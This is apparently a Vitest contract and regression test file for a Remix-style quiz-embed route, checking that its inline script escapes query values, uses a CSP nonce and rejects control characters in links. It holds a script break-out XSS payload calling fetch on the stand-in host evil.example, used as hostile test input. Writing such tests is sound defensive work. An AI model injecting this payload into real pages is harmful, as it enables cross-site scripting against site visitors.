import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'

/**
 * Contract test for the inline script inside app/routes/quiz-embed.tsx.
 *
 * RED BY DESIGN. These assertions describe what Plan 01-02 must produce and they fail until
 * it lands.
 *
 * WHY TEXT ASSERTIONS. The script is a template string inside a loader, so TypeScript never
 * sees it as code — it is not typechecked and not linted, and it currently contains two live
 * defects. Asserting on its text is the only automated coverage it can have short of a browser
 * harness.
 *
 * WHAT THESE TESTS DO NOT PROVE. They prove the guards are PRESENT IN THE SOURCE, not that
 * they behave correctly in a browser. Behavior is proven by Gate F's console protocol in
 * Plan 01-06.
 *
 * GREP-GATE HYGIENE — MANDATORY, AND IT CONSTRAINS PLANS 01-02 AND 01-03.
 * Assertions 1, 2, and 3b below are ABSENCE assertions over raw file text. A comment or string
 * literal that reproduces a forbidden token silently invalidates the assertion meant to
 * satisfy it — the test goes green while the defect still ships, or stays red on correct work.
 * So: in this file's target and in symptom-quiz.liquid, no comment, doc block, or string
 * literal may reproduce any of the five forbidden token sequences asserted against here and in
 * liquid-block-contract.test.ts. When removing one, describe it in prose — do not quote it
 * verbatim, not even to explain the fix. The assertions are the single source of truth.
 */

const EMBED = readFileSync(join(process.cwd(), 'app', 'routes', 'quiz-embed.tsx'), 'utf-8')

describe('quiz-embed.tsx inline script contract', () => {
  it('no longer tries to override the location assign method (D-02)', () => {
    // Location.assign is [LegacyUnforgeable] — non-writable and non-configurable — so the
    // patch fails silently in sloppy mode. It already cost this project a live defect.
    expect(EMBED).not.toContain('window.location.assign = function')
  })

  it('no longer resolves anchor hrefs against the iframe document (D-03)', () => {
    // Resolving in the iframe produces an absolute URL on the Fly origin, which is how the
    // storefront ended up being sent to the app domain. Post the raw relative path instead.
    expect(EMBED).not.toContain('new URL(href, window.location.href)')
  })

  it('posts a navigate payload keyed on a relative path, not a URL (D-01/D-02)', () => {
    // Renaming the key makes a stale cached bundle fail CLOSED against a new parent rather
    // than being silently rejected under a name that looks correct.
    expect(EMBED).toMatch(/'quiz:navigate'[\s\S]{0,160}?\bpath\s*:/)
    expect(EMBED).not.toMatch(/'quiz:navigate'[\s\S]{0,160}?\burl\s*:/)
  })

  it('injects both product handles into the runtime config (D-12)', () => {
    expect(EMBED).toContain('tnProductHandle')
    expect(EMBED).toContain('txProductHandle')
  })

  /**
   * Code review CR-01 / CR-02 follow-up.
   *
   * The four assertions above are absence-only, which the review flagged as asymmetric with
   * liquid-block-contract.test.ts — that file asserts each positional rule is PRESENT, this one
   * only asserted old defects were gone. A source file can satisfy every absence assertion while
   * containing no guard at all. These add the presence half.
   */
  it('routes every inline-script interpolation through the HTML-safe encoder (CR-01)', () => {
    // Raw JSON.stringify does not escape "<", so any searchParam value could close the script
    // element. Every interpolation inside the inline block must use the escaping wrapper.
    const scriptBlock = EMBED.slice(EMBED.indexOf('AlleDropsQuizConfig'), EMBED.indexOf('</scr' + 'ipt>'))
    expect(scriptBlock).toContain('jsonForScript(')
    expect(scriptBlock).not.toContain('JSON.stringify(')
  })

  it('pins script execution with a per-response nonce (CR-01 defence in depth)', () => {
    expect(EMBED).toContain('scriptNonce')
    expect(EMBED).toContain("script-src 'self' 'nonce-")
    expect(EMBED).toContain("object-src 'none'")
    expect(EMBED).toContain("base-uri 'none'")
  })

  it('rejects the parser-stripped control characters before the positional checks (CR-02)', () => {
    // The anchor interceptor is a third hand-port of the same rule set (navigation.ts and the
    // Liquid block hold the other two). TAB/LF/CR are removed by the URL parser, so they shift
    // the indexes the positional checks rely on — they must be rejected, and rejected first.
    for (const code of [9, 10, 13]) {
      expect(EMBED).toContain(`href.indexOf(String.fromCharCode(${code})) !== -1`)
    }
    const controlCheck = EMBED.indexOf('String.fromCharCode(9)')
    const positionalCheck = EMBED.indexOf("href.charAt(0) !== '/'")
    expect(controlCheck).toBeGreaterThan(-1)
    expect(positionalCheck).toBeGreaterThan(-1)
    expect(controlCheck).toBeLessThan(positionalCheck)
  })
})

/**
 * End-to-end proof for CR-01, executed against the real loader rather than the source text.
 *
 * The contract assertions above read the file; these read the bytes the loader actually emits with
 * a hostile query string. This is the assertion that would have caught CR-01 originally — all 86
 * tests passed while the XSS shipped, because nothing executed the loader with hostile input.
 */
describe('quiz-embed loader output with hostile query params (CR-01)', () => {
  const BREAKOUT = "</scr" + "ipt><scr" + "ipt>fetch('https://evil.example/')</scr" + "ipt>"

  async function render(params: Record<string, string>): Promise<{ html: string; csp: string }> {
    const { loader } = await import('../app/routes/quiz-embed')
    const qs = new URLSearchParams(params).toString()
    const request = new Request(`https://alle-drops-quiz-app.fly.dev/quiz-embed?${qs}`)
    // The loader's signature carries router-supplied fields this route never reads.
    const res = (await loader({ request } as never)) as Response
    return {
      html: await res.text(),
      csp: res.headers.get('Content-Security-Policy') ?? '',
    }
  }

  // The payload's own text (evil.example) DOES appear in the output, as inert escaped JSON data.
  // That is correct and is not the vulnerability. The vulnerability was the payload terminating
  // the script element, so these assert the element structure and the escaping, not the absence
  // of the string.
  for (const param of ['consult', 'testOptions', 'tnProduct', 'txProduct', 'shop']) {
    it(`neutralises a script break-out delivered via ?${param}`, async () => {
      const { html } = await render({ [param]: BREAKOUT })
      const opens = html.split('<scr' + 'ipt').length - 1
      const closes = html.split('</scr' + 'ipt>').length - 1
      // Exactly two script elements exist by design: the inline config block and the bundle tag.
      // A break-out shows up as extra opens or closes.
      expect(opens).toBe(2)
      expect(closes).toBe(2)
      // The angle brackets from the payload survived as escapes rather than as markup.
      expect(html).toContain('\\u003c')
    })
  }

  it('emits the hostile value as an inert string that round-trips exactly', async () => {
    const { html } = await render({ tnProduct: BREAKOUT })
    const line = html.split('\n').find((l) => l.includes('tnProductHandle:'))
    expect(line).toBeDefined()
    const encoded = line!.slice(line!.indexOf(':') + 1).trim().replace(/,$/, '')
    // Parses as a JavaScript expression, and yields the payload verbatim — proving the escaping is
    // transport-only and the value reaches the quiz unchanged.
    expect(Function(`"use strict"; return (${encoded});`)()).toBe(BREAKOUT)
  })

  it('serves a script-src with the same nonce it stamps on both script tags', async () => {
    const { html, csp } = await render({})
    expect(csp).toContain("object-src 'none'")
    expect(csp).toContain("base-uri 'none'")
    const match = csp.match(/'nonce-([a-f0-9]+)'/)
    expect(match).not.toBeNull()
    const nonce = match![1]
    // Both the inline block and the bundle tag must carry it, or the page breaks under its own CSP.
    expect(html.split(`nonce="${nonce}"`).length - 1).toBe(2)
  })

  it('issues a different nonce per response', async () => {
    const a = (await render({})).csp.match(/'nonce-([a-f0-9]+)'/)![1]
    const b = (await render({})).csp.match(/'nonce-([a-f0-9]+)'/)![1]
    expect(a).not.toBe(b)
  })
})
